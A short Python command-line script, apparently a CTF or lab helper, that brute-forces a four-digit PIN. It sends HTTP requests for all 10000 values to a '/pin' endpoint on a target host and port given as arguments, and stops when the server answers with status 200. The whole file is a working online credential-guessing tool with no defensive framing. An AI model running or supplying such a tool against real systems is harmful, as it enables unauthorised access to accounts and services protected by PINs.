import argparse
import sys

import requests as r

# create the parser
parser = argparse.ArgumentParser(description="PIN brute forcer")

# adding the arguments
parser.add_argument(
    "-t",
    "--target",
    type=str,
    help="The IP address or domain name of the target without http or https",
)
parser.add_argument("-p", "--port", type=str, help="The target port", default=80)

# getting teh arguments
args = parser.parse_args()


def brute_force():
    for i in range(10000):
        pin = str(i).zfill(4)
        response = r.get(f"http://{args.target}:{args.port}/pin?pin={pin}")

        sys.stdout.write(f"Trying PIN number {pin}\r")
        sys.stdout.flush()
        if response.status_code == 200:
            sys.stdout.write(f"============ CORRECT PIN FOUND {pin}\n")
            sys.exit(0)

    sys.stdout.write("No PIN found")


if __name__ == "__main__":
    brute_force()

# python pin_brute.py --target test.com --port 4444
